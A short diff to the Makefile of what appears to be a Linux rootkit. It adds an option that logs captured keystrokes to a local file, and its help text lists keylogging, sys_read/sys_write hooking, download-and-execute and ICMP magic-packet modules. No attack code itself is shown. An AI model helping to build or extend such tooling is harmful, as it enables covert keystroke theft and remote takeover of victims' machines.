@@ -7,6 +7,9 @@ ifdef KEYLOGGER
 ifdef UNLOCK
 	MODULES += -D_CONFIG_UNLOCK_
 endif
+ifdef LOGFILE
+	MODULES += -D_CONFIG_LOGFILE_
+endif
 endif
 
 ifdef HOOKRW
@@ -44,6 +47,7 @@ default:
 	@echo "Supported modules:"
 	@echo "KEYLOGGER    Monitor keystrokes"
 	@echo "  UNLOCK     Unlock the screen upon given key sequence"
+	@echo "  LOGFILE    Log keystrokes to a local file"
 	@echo "HOOKRW       Hook sys_read and sys_write"
 	@echo "DLEXEC       Download & execute a binary upon event"
 	@echo "  ICMP       Monitor inbound ICMP for magic packet"
